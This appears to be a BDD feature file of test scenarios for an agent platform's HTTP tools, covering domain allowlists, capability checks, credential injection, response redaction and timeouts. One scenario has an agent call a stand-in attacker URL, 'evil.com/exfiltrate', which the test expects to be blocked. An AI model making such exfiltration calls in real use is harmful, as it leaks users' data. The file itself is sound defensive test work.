@use-case @http @external-api @security @milestone-3
Feature: Agent External Communication via HTTP Tools
  As a Mycelos user with agents that need to call external APIs
  I want HTTP requests to flow through the Security Layer
  So that all external communication is logged, scoped, and controlled

  Agents cannot make HTTP requests directly (sandbox has no network).
  Instead they use http.get/post/put/delete tools that execute in
  the Gateway process and flow through the full security pipeline.

  Background:
    Given Mycelos is running with the gateway active
    And a research-agent is registered with capabilities: ["http.get"]

  @http-get @happy-path
  Scenario: Agent makes a GET request to an allowed domain
    Given the research-agent has a policy: http.domains = ["api.github.com"]
    When the agent calls:
      """
      result = run(tool="http.get", args={
          "url": "https://api.github.com/repos/user/repo",
          "headers": {"Accept": "application/json"}
      })
      """
    Then the Security Layer validates:
      | check                | result                |
      | capability token     | http.get in scope     |
      | URL allowlist        | api.github.com allowed |
    And the Gateway executes the HTTP request
    And the response is sanitized (credentials removed)
    And the agent receives the JSON response
    And the request is logged in the audit trail

  @http-post @authenticated
  Scenario: Agent makes an authenticated POST request
    Given the agent has capability "http.post"
    And a credential is stored for "github" in the Credential Proxy
    When the agent calls:
      """
      result = run(tool="http.post", args={
          "url": "https://api.github.com/repos/user/repo/issues",
          "body": {"title": "Bug report", "body": "Description"},
      })
      """
    Then the Credential Proxy injects the Authorization header
    And the agent never sees the GitHub token
    And the POST request is executed with the injected auth
    And the response is returned to the agent

  @http-blocked @unknown-domain
  Scenario: Agent tries to call an unauthorized domain
    Given the research-agent has policy: http.domains = ["api.github.com"]
    When the agent calls:
      """
      result = run(tool="http.get", args={
          "url": "https://evil.com/exfiltrate"
      })
      """
    Then the URL allowlist check fails
    And the request is blocked
    And the agent receives an error: "Domain not allowed: evil.com"
    And an audit event is logged: "http.blocked"

  @http-no-capability
  Scenario: Agent without http capability is blocked
    Given an email-agent that only has capability ["email.read"]
    When the agent tries to call http.get
    Then the capability token validation fails
    And the agent receives: "Permission denied: http.get not in scope"

  @http-download @artifact
  Scenario: Agent downloads a file via HTTP
    Given the agent has capability "http.download"
    When the agent calls:
      """
      result = run(tool="http.download", args={
          "url": "https://example.com/report.pdf",
          "filename": "report.pdf"
      })
      """
    Then the file is downloaded by the Gateway
    And the Inbound Sanitizer checks the PDF for safety
    And if safe, the file is stored as an artifact
    And the agent receives the artifact path: "/input/report.pdf"
    And if unsafe (JavaScript in PDF), the download is blocked

  @http-response-sanitized
  Scenario: HTTP response containing credentials is sanitized
    Given the agent makes an HTTP request
    When the API response accidentally contains:
      """
      {"error": "Auth failed for token sk-ant-secret12345678901234567"}
      """
    Then the Response Sanitizer redacts the credential
    And the agent receives:
      """
      {"error": "Auth failed for token [REDACTED]"}
      """

  @http-timeout
  Scenario: HTTP request timeout is enforced
    Given the agent makes an HTTP request to a slow endpoint
    When the request takes longer than 30 seconds
    Then the request is cancelled
    And the agent receives an error: "HTTP request timed out after 30s"
    And no partial data is returned
